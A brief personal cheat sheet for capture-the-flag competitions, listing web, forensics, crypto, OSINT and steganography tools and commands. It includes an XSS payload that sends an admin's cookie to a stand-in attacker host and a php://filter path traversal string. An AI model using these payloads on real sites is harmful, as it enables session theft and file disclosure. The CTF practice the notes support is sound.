# Welcome !
Hi! 
# WEB

 **burpsuit**
       **gobuster**
**ffuf**
        **Cookie Editor**
**xss payload to steal cookie from admin ->**
**script fetch(https://attacker.com/steal?cookie=%27btoa(document.cookie)); /script**
**path traversal ->**
- php://filter/convert.base64-encode/resource=file

# Fronsics Tools

**HxD -> to show file signeture**
**Memory Dump = volatility**
-  -1 volatility -f fileName imageinfo
-2 volatility -f fileName profile=profileName pslist
-3 volatility -f fileName profile=profileName consoles //for show cmd log 
**---------------------------------**
- --1 volatility -f fileName imageinfo
-2 volatility -f fileName profile=profileName pslist
if we see notepad is was open ->
-3 volatility -f fileName profile=profileName notepad
if we see internet explorer is was open ->
-4 volatility -f fileName profile=profileName iehistory (edited)
-4 volatility -f fileName profile=profileName filescan // to list files on system
-6 volatility -f fileName profile=profileName dumpfiles -Q hexAddress -D locationWhereYouWantToSave

**binwalk to detect file extention**
- -1 binwalk fileName -e // to extract files

**file signeture list -> https://en.wikipedia.org/wiki/List_of_file_signatures**

**- Note: if the file extention was odt change it to rar**

**cipher decoder -> https://www.dcode.fr/caesar-cipher**

**text compere -> https://text-compare.com/**

**sonic visualiser -> for audio**
- sonic trick
layer -> add spectrogram
# Cryptography

**Cryptii -> https://cryptii.com/**
**file signeture list -> https://en.wikipedia.org/wiki/List_of_file_signatures**
**google hacking -> https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06**
**Cyber chef > to decode and detect hash type 
->https://gchq.github.io/CyberChef/**
**if the cipher has elements @ like maker roete47**
**if the cipher has _ . -> # Morse decode**

# OSINT
**yandex for image**
**to found user social accountes https://github.com/sherlock-project/sherlock.git**
**dtmf decoder -> for phone sound**

****

# steganography
**steghide for jpg**
**-> steghide extract -sf image.jpg**
**zsteg for png images**
**stegoveritas for every images**
**-> stegoveritas image.jpg**
**sonic visualiser for wav files**
**https://www.spammimic.com/ -> text**
**secretaudio for audio files**

- if you found image try to
 cat image.jpg
strings image.jpg
